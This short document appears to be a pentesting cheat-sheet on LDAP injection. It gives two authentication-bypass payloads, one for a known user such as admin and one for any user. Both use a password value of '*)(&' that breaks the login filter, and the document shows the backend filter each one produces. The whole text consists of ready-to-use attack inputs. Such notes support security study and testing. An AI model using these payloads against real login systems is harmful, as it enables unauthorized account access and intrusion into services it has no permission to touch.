#ldapi #ldap

## Known User
Injection
```
$login = admin
$password = *)(&
```

Backend
```
(&(uid=$login)(userPassword=$password))
(&(uid=admin)(userPassword=*)(&))
```

## Any User
Injection
```
$login = *
$password = *)(&
```

Backend
```
(&(uid=$login)(userPassword=$password))
(&(uid=*)(userPassword=*)(&))
```


